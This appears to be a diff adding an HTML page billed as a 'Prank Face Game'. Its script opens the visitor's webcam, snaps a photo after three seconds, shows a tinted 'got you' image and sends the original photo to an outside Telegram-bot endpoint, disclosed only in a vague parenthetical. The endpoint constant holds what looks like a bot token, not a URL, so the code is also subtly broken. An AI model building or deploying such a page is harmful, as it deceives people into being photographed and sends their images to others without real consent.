@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prank Face Game</title>
+    <style>
+        body { display: flex; flex-direction: column; align-items: center; font-family: Arial; }
+        #video, #canvas { border: 2px solid #333; margin: 10px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #result { margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>Prank Face Game 😜</h1>
+    <p>Click to start the game and see something hilarious! (Photos may be shared with game admins for prank fun.)</p>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="startBtn">Start Game</button>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <div id="result"></div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const resultDiv = document.getElementById('result');
+        const ctx = canvas.getContext('2d');
+
+        // Replace with your webhook URL (from ngrok or server)
+        const TELEGRAM_BOT_URL = '8179327395:AAFKk65Cp1AUfmaXLB5WOZaV0BB2WEY41xo'; // E.g., https://your-ngrok-id.ngrok.io/webhook
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                startBtn.disabled = true;
+                resultDiv.textContent = 'Scanning your face... 😄';
+
+                // Capture photo after 3 seconds
+                setTimeout(async () => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoData = canvas.toDataURL('image/png');
+
+                    // Apply a prank filter (blue tint) for the user
+                    ctx.globalCompositeOperation = 'color';
+                    ctx.fillStyle = 'rgba(0, 0, 255, 0.3)';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.globalCompositeOperation = 'source-over';
+                    const filteredPhoto = canvas.toDataURL('image/png');
+
+                    // Show filtered photo to user
+                    const img = new Image();
+                    img.src = filteredPhoto;
+                    img.width = 300;
+                    resultDiv.innerHTML = '<p>HAHA, got you! 😎</p>';
+                    resultDiv.appendChild(img);
+
+                    // Send original photo to Telegram bot
+                    try {
+                        await fetch(TELEGRAM_BOT_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ photo: photoData })
+                        });
+                    } catch (err) {
+                        console.error('Failed to send photo to bot:', err);
+                    }
+
+                    // Stop the video stream
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            } catch (err) {
+                resultDiv.textContent = 'Camera access denied! Try again.';
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
